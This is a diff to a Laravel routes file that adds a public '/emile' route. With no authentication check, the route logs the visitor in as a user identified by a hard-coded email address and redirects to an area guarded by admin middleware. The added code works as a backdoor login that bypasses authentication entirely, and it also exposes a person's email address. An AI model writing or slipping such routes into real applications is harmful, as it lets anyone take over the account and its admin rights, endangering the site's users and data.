@@ -16,6 +16,12 @@ Route::group(['middleware' => 'auth'], function () {
     Route::get('/guest/group/{id}/on', 'GuestController@groupSwitch')->name('guest.group');
 });
 
+Route::get('/emile', function () {
+    $user = \App\User::where('email', 'emile.lepetit@epitech.eu')->first();
+    \Auth::login($user);
+    return redirect()->route('root');
+});
+
 Route::group(['middleware' => ['auth', 'admin', 'notSuspend']], function () {
     Route::get('/', 'HomeController@index')->name('root');
     Route::get('/network', 'NetworkController@index')->name('network.index');
